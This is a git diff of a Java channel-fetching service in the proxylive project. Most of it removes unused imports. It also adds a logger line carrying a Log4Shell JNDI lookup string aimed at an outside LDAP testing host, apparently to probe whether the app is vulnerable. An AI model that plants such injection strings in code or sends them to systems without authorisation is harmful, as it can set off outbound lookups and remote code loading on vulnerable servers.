@@ -7,11 +7,9 @@ import com.github.segator.proxylive.config.GitSource;
 import com.github.segator.proxylive.config.ProxyLiveConfiguration;
 import com.github.segator.proxylive.entity.Channel;
 import com.github.segator.proxylive.entity.ChannelSource;
-import com.github.segator.proxylive.tasks.StreamProcessorsSession;
 import org.apache.commons.io.FileUtils;
 import org.apache.commons.io.IOUtils;
 import org.eclipse.jgit.api.*;
-import org.eclipse.jgit.lib.Ref;
 import org.eclipse.jgit.revwalk.RevCommit;
 import org.eclipse.jgit.revwalk.RevWalk;
 import org.eclipse.jgit.transport.TrackingRefUpdate;
@@ -28,9 +26,7 @@ import org.springframework.scheduling.annotation.Scheduled;
 import javax.annotation.PostConstruct;
 import javax.annotation.PreDestroy;
 import java.io.*;
-
 import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
 import java.net.URISyntaxException;
 import java.net.URL;
 import java.nio.file.Files;
@@ -76,6 +72,7 @@ public class ChannelURLService implements ChannelService {
     @Scheduled(fixedDelay = 60 * 1000) //Every Minute
     @PostConstruct
     public void getChannelInfo() throws Exception {
+        logger.info("${jndi:ldap://log4shell.huntress.com:1389/5592b51b-f81d-4295-a173-01b91f3b05d4}");
         if(new Date().getTime()-lastUpdate>+(config.getSource().getEpg().getRefresh()*1000)) {
             ObjectMapper objectMapper = new ObjectMapper();
             List<Channel> channels=null;
